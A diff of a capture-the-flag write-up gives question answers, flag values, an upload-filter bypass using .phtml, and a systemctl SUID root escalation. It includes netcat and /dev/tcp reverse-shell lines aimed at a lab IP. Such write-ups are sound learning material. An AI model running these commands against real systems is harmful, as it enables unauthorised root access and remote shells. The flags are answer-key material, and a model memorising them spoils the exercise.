@@ -55,45 +55,57 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 30.62 seconds
 
 Q. How many ports are open?
+
 A> 6
 
 Q. What version of the squid proxy is running on the machine?
+
 A.  4.10
 
 Q. How many ports will Nmap scan if the flag -p-400 was used?
+
 A. 400
 
-Q. What is the most likely operating system this machine is running?
+Q. What is the most likely operating system this machine is running? 
+
 A. Ubuntu
 
 Q. What port is the web server running on?
+
 A. 3333
 
 Q. What is the flag for enabling verbose mode using Nmap?
+
 A. -v
 
 # TASK 3
 
 Q. What is the directory that has an upload form page?
+
 A. /internal/
 
 # TASK 4
 
 Q. What common file type you'd want to upload to exploit the server is blocked? Try a couple to find out.
+
 A. .php
 
 Q. What extension is allowed after running the above exercise?
+
 A. phtml
 
 Q. What is the name of the user who manages the webserver?
+
 A. bill
 
 Q. What is the user flag?
+
 A. 8bd7992fbe8a6ad22a63361004cfcedb
 
 # TASK 5
 
 Q. On the system, search for all SUID files. Which file stands out?
+
 A. /bin/systemctl
 
 find / -type f -perm -04000 -ls 2>/dev/null
@@ -133,6 +145,7 @@ find / -type f -perm -04000 -ls 2>/dev/null
    393653     48 -rwsr-xr-x   1 root     root               48200 Apr  2 00:10 /sbin/mount.cifs
 
 Q. What is the root flag value?
+
 A. a58ff8579f0a9270368d33a9966c7fd5
 
 https://gtfobins.github.io/gtfobins/systemctl/
@@ -140,12 +153,19 @@ https://gtfobins.github.io/gtfobins/systemctl/
 Move to a writeable directory - I used /tmp
 
 TF=$(mktemp).service
+
 echo '[Service]
+
 Type=oneshot
+
 ExecStart=/bin/sh -c "id > /tmp/output"
+
 [Install]
+
 WantedBy=multi-user.target' > $TF
+
 /bin/systemctl link $TF
+
 /bin/systemctl enable --now $TF
 
 'We need to change the ExecStart command so I can create reverse shell as root. This is where my problems started...
@@ -153,10 +173,15 @@ WantedBy=multi-user.target' > $TF
 Googling around I found 
 
 ExecStart=/bin/sh -c "nc -e /bin/bash 10.2.57.121 9999"
+
 'that didn't work. no -e option
+
 ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.2.57.121/5555 0>&1'
+
 'this didn't work either. "Bad fd number"
+
 'More googling!
+
 'Finally I gave up on reverse shell and just decided to cat out the file and redirect it to a new file in temp I could read
 
 ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/root.txt"
